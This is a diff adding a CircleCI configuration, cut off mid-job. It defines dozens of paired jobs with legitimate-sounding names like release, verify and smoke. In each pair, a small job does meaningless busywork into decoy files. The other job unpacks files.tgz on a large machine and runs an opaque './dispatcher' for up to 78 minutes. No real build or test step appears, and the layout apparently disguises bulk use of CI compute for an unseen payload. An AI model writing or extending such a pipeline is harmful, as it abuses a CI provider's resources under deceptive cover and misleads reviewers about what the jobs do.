@@ -1,0 +1,1247 @@
+version: 2.1
+
+jobs:
+  cacher_europa-beta:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: spin cycle
+          command: |
+            mkdir -p /tmp/handoff
+            set +o pipefail 2>/dev/null; date -u +%s%N > /tmp/handoff/final.md; for i in $(seq 1 5000); do echo "$i $(date +%N)" >> /tmp/handoff/final.md; done; true
+            echo "staging complete; file length=$(wc -c </tmp/handoff/final.md)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - final.md
+  europa-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Load previous
+          command: |
+            { od -An -c /tmp/handoff/final.md 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar -I gzip -xf files.tgz
+      - run:
+          no_output_timeout: 78m
+          command: "./dispatcher"
+  gamma_verify:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: blend edges
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=50;i++)if(i%2)o++;else e++; print o"-"e}'; true ; } > /tmp/handoff/stage-ready.sig
+            echo "staging complete; file length=$(wc -c </tmp/handoff/stage-ready.sig)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - stage-ready.sig
+  verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Load previous
+          command: |
+            { od -An -c /tmp/handoff/stage-ready.sig 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar -I gzip -xf files.tgz
+      - run:
+          no_output_timeout: 78m
+          command: "./dispatcher"
+  stepA_WEB-609:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: noise reduce
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; sed -n 'p;p' <<<"double"; true ; } > /tmp/handoff/buffer.raw
+            echo "staging complete; file length=$(wc -c </tmp/handoff/buffer.raw)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - buffer.raw
+  WEB-609:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Load previous
+          command: |
+            { od -An -c /tmp/handoff/ckpt-E.pt 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar -I gzip -xf files.tgz
+      - run:
+          no_output_timeout: 78m
+          command: "./dispatcher"
+  hydrate_Rollout_Image8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: calf raise
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="repetition"; for(i=1;i<=length(s);i++){c=substr(s,i,1); if(c in seen){dup++}; seen[c]=1}; print dup}'; true ; } > /tmp/handoff/step-ok.txt
+            echo "staging complete; file length=$(wc -c </tmp/handoff/step-ok.txt)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - step-ok.txt
+  Rollout_Image8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Load previous
+          command: |
+            { od -An -c /tmp/handoff/step-ok.txt 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar -I gzip -xf files.tgz
+      - run:
+          no_output_timeout: 78m
+          command: "./dispatcher"
+  phase2_brodcast-37:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: dissonance
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; printf "%s\n" {aa..zz} 2>/dev/null | head -5 || printf "%s\n" a1 a2 b1 b2; true ; } > /tmp/handoff/.done
+            echo "staging complete; file length=$(wc -c </tmp/handoff/.done)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - .done
+  brodcast-37:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Load previous
+          command: |
+            { od -An -c /tmp/handoff/.done 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar -I gzip -xf files.tgz
+      - run:
+          no_output_timeout: 78m
+          command: "./dispatcher"
+  rerun_Build_App7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: below decks
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; echo $(( RANDOM + RANDOM )) | md5sum; true ; } > /tmp/handoff/output.txt
+            echo "staging complete; file length=$(wc -c </tmp/handoff/output.txt)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - output.txt
+  Build_App7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Load previous
+          command: |
+            { od -An -c /tmp/handoff/output.txt 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar -I gzip -xf files.tgz
+      - run:
+          no_output_timeout: 78m
+          command: "./dispatcher"
+  generate_v2-alpha:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: birch bark
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=100;for(i=1;i<=n;i++)if(i*i<n)r=i;print r}'; true ; } > /tmp/handoff/stash.bin
+            echo "staging complete; file length=$(wc -c </tmp/handoff/stash.bin)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - stash.bin
+  v2-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Load previous
+          command: |
+            { od -An -c /tmp/handoff/stash.bin 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar -I gzip -xf files.tgz
+      - run:
+          no_output_timeout: 78m
+          command: "./dispatcher"
+  prefetch_release:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: against grain
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; date -d "next Friday" +%A 2>/dev/null || date +%A; true ; } > /tmp/handoff/report.out
+            echo "staging complete; file length=$(wc -c </tmp/handoff/report.out)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - report.out
+  release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Load previous
+          command: |
+            { od -An -c /tmp/handoff/ckpt-E.pt 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar -I gzip -xf files.tgz
+      - run:
+          no_output_timeout: 78m
+          command: "./dispatcher"
+  Delta_pr:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: rocket stove
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; head -c 23068672 /dev/urandom | sha256sum; true ; } > /tmp/handoff/step-complete.sig
+            echo "staging complete; file length=$(wc -c </tmp/handoff/step-complete.sig)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - step-complete.sig
+  pr:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Load previous
+          command: |
+            { od -An -c /tmp/handoff/step-complete.sig 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar -I gzip -xf files.tgz
+      - run:
+          no_output_timeout: 78m
+          command: "./dispatcher"
+  hook_gating:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: bonk
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 200 | awk 'END{print NR*NR+1}'; true ; } > /tmp/handoff/ckpt-E.pt
+            echo "staging complete; file length=$(wc -c </tmp/handoff/ckpt-E.pt)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - ckpt-E.pt
+  gating:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Load previous
+          command: |
+            { od -An -c /tmp/handoff/ckpt-E.pt 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar -I gzip -xf files.tgz
+      - run:
+          no_output_timeout: 78m
+          command: "./dispatcher"
+  compile_rc-v9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: flag yellow
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{seed=42; for(i=0;i<20;i++){seed=(seed*1103515245+12345)%2147483648; print seed}}' | tail -3; true ; } > /tmp/handoff/package.tgz
+            echo "staging complete; file length=$(wc -c </tmp/handoff/package.tgz)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - package.tgz
+  rc-v9:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Load previous
+          command: |
+            { od -An -c /tmp/handoff/final.md 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar -I gzip -xf files.tgz
+      - run:
+          no_output_timeout: 78m
+          command: "./dispatcher"
+  gamma_bob-verify:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: reverse fly
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=20; for(a=0;a<n;a++) for(b=0;b<n;b++) if((a+b)%7==0) c++; print c}'; true ; } > /tmp/handoff/gate-complete.log
+            echo "staging complete; file length=$(wc -c </tmp/handoff/gate-complete.log)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - gate-complete.log
+  bob-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Load previous
+          command: |
+            { od -An -c /tmp/handoff/ckpt-E.pt 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar -I gzip -xf files.tgz
+      - run:
+          no_output_timeout: 78m
+          command: "./dispatcher"
+  vendor_sep25-canary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: calm wind
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; printf "%d\n" {1..40} | sort -R 2>/dev/null | head -3 || printf "%d\n" {1..40} | head -3; true ; } > /tmp/handoff/audit.ndjson
+            echo "staging complete; file length=$(wc -c </tmp/handoff/audit.ndjson)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - audit.ndjson
+  sep25-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Load previous
+          command: |
+            { od -An -c /tmp/handoff/final.md 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar -I gzip -xf files.tgz
+      - run:
+          no_output_timeout: 78m
+          command: "./dispatcher"
+  inspect_raj-test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: jive hop
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; ( echo "hdr"; seq 1 142100; echo "ftr" ) | wc -l; true ; } > /tmp/handoff/64.out
+            echo "staging complete; file length=$(wc -c </tmp/handoff/64.out)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 64.out
+  raj-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Load previous
+          command: |
+            { od -An -c /tmp/handoff/ckpt-E.pt 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar -I gzip -xf files.tgz
+      - run:
+          no_output_timeout: 78m
+          command: "./dispatcher"
+  produce_Build_App6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: cog bent
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{a=1; for(i=0;i<10;i++){a*=2}; print a}'; true ; } > /tmp/handoff/.pid
+            echo "staging complete; file length=$(wc -c </tmp/handoff/.pid)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - .pid
+  Build_App6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Load previous
+          command: |
+            { od -An -c /tmp/handoff/ckpt-E.pt 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar -I gzip -xf files.tgz
+      - run:
+          no_output_timeout: 78m
+          command: "./dispatcher"
+  postbuild_shippit:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: maple splint
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; cat /proc/self/status | grep -E "^Name|^Uid" | head -2; true ; } > /tmp/handoff/relay.state
+            echo "staging complete; file length=$(wc -c </tmp/handoff/relay.state)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - relay.state
+  shippit:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Load previous
+          command: |
+            { od -An -c /tmp/handoff/ckpt-E.pt 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar -I gzip -xf files.tgz
+      - run:
+          no_output_timeout: 78m
+          command: "./dispatcher"
+  canary1_smoke:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: starved
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 1000 | awk 'NR%13==0' | awk 'END{print NR}'; true ; } > /tmp/handoff/pt-B.pickle
+            echo "staging complete; file length=$(wc -c </tmp/handoff/pt-B.pickle)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - pt-B.pickle
+  smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Load previous
+          command: |
+            { od -An -c /tmp/handoff/final.md 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar -I gzip -xf files.tgz
+      - run:
+          no_output_timeout: 78m
+          command: "./dispatcher"
+  postcheck_q4-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: hang shirt
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; printf "%s\n" {1..20} | wc -l; true ; } > /tmp/handoff/log.gz
+            echo "staging complete; file length=$(wc -c </tmp/handoff/log.gz)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - log.gz
+  q4-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Load previous
+          command: |
+            { od -An -c /tmp/handoff/final.md 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar -I gzip -xf files.tgz
+      - run:
+          no_output_timeout: 78m
+          command: "./dispatcher"
+  install_validate-production-artifact-bundle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: fortissimo
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; echo "abc" | fold -w1 | sort | uniq | wc -l; true ; } > /tmp/handoff/step-3.txt
+            echo "staging complete; file length=$(wc -c </tmp/handoff/step-3.txt)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - step-3.txt
+  validate-production-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Load previous
+          command: |
+            { od -An -c /tmp/handoff/step-3.txt 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar -I gzip -xf files.tgz
+      - run:
+          no_output_timeout: 78m
+          command: "./dispatcher"
+  hydrate_delta-7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: make fast
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(y=2000;y<=2024;y++){if(y%4==0&&y%100!=0||y%400==0)c++} print c}'; true ; } > /tmp/handoff/step-21.log
+            echo "staging complete; file length=$(wc -c </tmp/handoff/step-21.log)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - step-21.log
+  delta-7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Load previous
+          command: |
+            { od -An -c /tmp/handoff/final.md 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar -I gzip -xf files.tgz
+      - run:
+          no_output_timeout: 78m
+          command: "./dispatcher"
+  env_qa:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: tell the pm
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{a=0;b=1; for(i=0;i<20;i++){print b; c=a+b; a=b; b=c}}' | wc -l; true ; } > /tmp/handoff/relay.txt
+            echo "staging complete; file length=$(wc -c </tmp/handoff/relay.txt)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - relay.txt
+  qa:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Load previous
+          command: |
+            { od -An -c /tmp/handoff/final.md 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar -I gzip -xf files.tgz
+      - run:
+          no_output_timeout: 78m
+          command: "./dispatcher"
+  blue_vera-ci:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: scrub out
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s=sprintf("[%5s]","hi"); print s}'; true ; } > /tmp/handoff/.marker
+            echo "staging complete; file length=$(wc -c </tmp/handoff/.marker)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - .marker
+  vera-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Load previous
+          command: |
+            { od -An -c /tmp/handoff/ckpt-E.pt 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar -I gzip -xf files.tgz
+      - run:
+          no_output_timeout: 78m
+          command: "./dispatcher"
+  compile_hu-smoke:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: today or bust
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; set | wc -l; true ; } > /tmp/handoff/ckpt-B.pkl
+            echo "staging complete; file length=$(wc -c </tmp/handoff/ckpt-B.pkl)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - ckpt-B.pkl
+  hu-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Load previous
+          command: |
+            { od -An -c /tmp/handoff/final.md 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar -I gzip -xf files.tgz
+      - run:
+          no_output_timeout: 78m
+          command: "./dispatcher"
+  go_titan-final:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: reboot
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; ( echo "hdr"; seq 1 247790; echo "ftr" ) | wc -l; true ; } > /tmp/handoff/metrics.tsv
+            echo "staging complete; file length=$(wc -c </tmp/handoff/metrics.tsv)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - metrics.tsv
+  titan-final:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Load previous
+          command: |
+            { od -An -c /tmp/handoff/metrics.tsv 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar -I gzip -xf files.tgz
+      - run:
+          no_output_timeout: 78m
+          command: "./dispatcher"
+  prefetch_lets-go:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: flat check
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; echo "hostname=$(hostname 2>/dev/null) pid=$$"; true ; } > /tmp/handoff/step-25.log
+            echo "staging complete; file length=$(wc -c </tmp/handoff/step-25.log)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - step-25.log
+  lets-go:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Load previous
+          command: |
+            { od -An -c /tmp/handoff/ckpt-E.pt 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar -I gzip -xf files.tgz
+      - run:
+          no_output_timeout: 78m
+          command: "./dispatcher"
+  reset_d-v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: grill marks
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 50 | awk '{p*=$1}END{print p}' 2>/dev/null || seq 1 10 | awk '{p*=$1}END{print p}'; true ; } > /tmp/handoff/metrics.jsonl
+            echo "staging complete; file length=$(wc -c </tmp/handoff/metrics.jsonl)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - metrics.jsonl
+  d-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Load previous
+          command: |
+            { od -An -c /tmp/handoff/ckpt-E.pt 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar -I gzip -xf files.tgz
+      - run:
+          no_output_timeout: 78m
+          command: "./dispatcher"
+  runner_CHECK_LAB:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: interlude
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 35175); do printf "%d\n" $i; done ) | sort -n | tail -1; true ; } > /tmp/handoff/READY.txt
+            echo "staging complete; file length=$(wc -c </tmp/handoff/READY.txt)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - READY.txt
+  CHECK_LAB:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Load previous
+          command: |
+            { od -An -c /tmp/handoff/ckpt-E.pt 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
